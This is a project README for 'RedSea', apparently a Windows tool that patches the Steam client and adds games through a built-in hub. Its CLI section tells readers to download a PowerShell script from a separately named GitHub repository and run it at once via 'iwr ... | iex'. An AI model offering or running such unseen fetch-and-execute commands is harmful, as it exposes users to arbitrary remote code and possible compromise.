# RedSea

RedSea is a Steam companion application for Windows. It lets you manage your Steam library and configure your setup from one clean, minimal interface.

![Status](https://img.shields.io/badge/status-release-green)
![Version](https://img.shields.io/badge/version-3.2.0-blue)

---

## Features

- **Millennium integration** with automatic installation
- **Built-in Game Hub** — search and add games without external websites
- **Custom game loader** for titles not available in the hub
- **Fast and lightweight interface**
- **One-click Steam restart**
- **PowerShell CLI** for headless use

---

## Technologies

- **C# / WPF** — desktop app
- **Node.js / Express** — website and API
- **.NET 9** — runtime

---

## Installation

Download the latest release and run `RedSea.exe` on Windows. No installer required.

---

## CLI (Windows)

RedSea includes a PowerShell CLI for patching Steam without the desktop app.

```powershell
iwr -useb 'https://raw.githubusercontent.com/estrww77-dotcom/Treest/refs/heads/master/CLI/OpenSteam.ps1' | iex
```

---

## How to Use

1. Download and run `RedSea.exe`
2. Click **Patch Steam** to apply the configuration
3. Search for a game in **Game Hub** and add it
4. Restart Steam — changes take effect immediately

---

## Compatibility

| Platform | Status        |
|----------|---------------|
| Windows  | Supported     |
| Linux    | Not supported |
| macOS    | Not supported |

---

## Disclaimer

This project is provided for educational and personal use only. Use responsibly and at your own risk.
